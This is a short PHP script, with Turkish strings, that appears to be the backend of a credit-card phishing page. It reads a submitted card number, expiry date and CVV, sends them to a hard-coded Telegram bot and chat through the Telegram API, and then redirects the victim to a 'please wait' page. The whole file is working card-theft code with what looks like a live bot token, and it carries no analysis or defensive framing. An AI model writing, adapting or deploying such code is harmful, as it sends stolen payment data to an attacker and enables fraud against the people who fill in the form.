 <?php

$creditCardNumber = $_POST['number'] ?? '';
$expirationDate = $_POST['expiry'] ?? '';
$cvv = $_POST['cvv'] ?? '';

$botToken = '6310872354:AAEXpycTL7iDBrndrBPpMhr-_aAepxC3VVk';
$chatId = '-1002121014985';


$message = "Kredi Kartı Numarası: $creditCardNumber\n";
$message .= "Son Kullanım Tarihi: $expirationDate\n";
$message .= "CVV: $cvv";


$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
$response = file_get_contents($telegramURL);


if ($response === false) {
    echo "Bir hata oluştu.";
} else {
    header("Location: bekle.html");
}
?>